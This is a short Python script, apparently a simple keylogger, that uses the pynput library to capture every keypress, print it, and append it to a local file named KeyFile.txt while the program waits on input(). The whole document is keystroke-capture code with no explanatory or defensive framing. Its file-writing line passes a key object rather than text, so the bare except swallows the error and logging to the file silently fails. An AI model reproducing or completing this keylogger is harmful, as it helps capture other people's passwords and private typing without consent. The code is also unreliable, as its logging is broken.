
from pynput import keyboard


def KeyPressed(key):
    print(str(key))

    with open("KeyFile.txt","a") as logKey:
        try:
            logKey.write(key)
        except:
            print(" key Error !")


listener = keyboard.Listener(on_press=KeyPressed)
listener.start()
input()


